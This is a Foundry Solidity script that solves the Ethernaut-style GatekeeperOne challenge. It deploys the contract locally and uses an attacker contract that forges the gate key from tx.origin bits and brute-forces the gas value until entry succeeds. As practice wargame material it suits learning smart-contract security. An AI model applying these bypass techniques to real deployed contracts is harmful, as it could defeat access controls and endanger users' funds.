pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

// for testing with anvil
contract deploy_GatekeeperOne is Script
{
    function run() external
    {
        vm.startBroadcast();

        GatekeeperOne gatekeeperOne = new GatekeeperOne();
        console.log("gatekeeper deployed at", address (gatekeeperOne));

        vm.stopBroadcast();
    }
}

contract enterFrom
{
    address target;
    bytes8 key;

    constructor(address _target)
    {
        target = _target;

        uint64 upper32 = 0x00000001_00000000;
        console.log(tx.origin);
        uint16 lower16 = uint16(uint160(tx.origin));
        uint64 gateKeyUint = (uint64(upper32) << 16) | lower16;
        key = bytes8(gateKeyUint);

        console.log("game key:", gateKeyUint);
    }

    function enter() external
    {
        console.log("entering the gatekeeper");
        uint gasNeeded = 41200; // this amount is not always the same,
                                // so might not work from the first time
                                // adjust according to the log of gasNeeded
                                // allowing for a small fluctuation in number of attempts
        bool passed;
        while (!passed)
        {
            try GatekeeperOne(target).enter{gas: gasNeeded}(key)
            {passed = true;}
            catch {gasNeeded ++;}
        } // with anvil this amount should be smaller, so replace ++ with --
        console.log("required gas amount was", gasNeeded);
    }
}

contract enter_GatekeeperOne is Script
{
    address gateKeeper; // assign your instance address or contract address on anvil for testing
    enterFrom enterPoint;

    function run() external
    {
        vm.startBroadcast();

        enterPoint = new enterFrom(gateKeeper);
        enterPoint.enter();

        address entrant = GatekeeperOne(gateKeeper).entrant();
        console.log("entrant:", entrant); // assure you passed :)

        vm.stopBroadcast();
    }
}

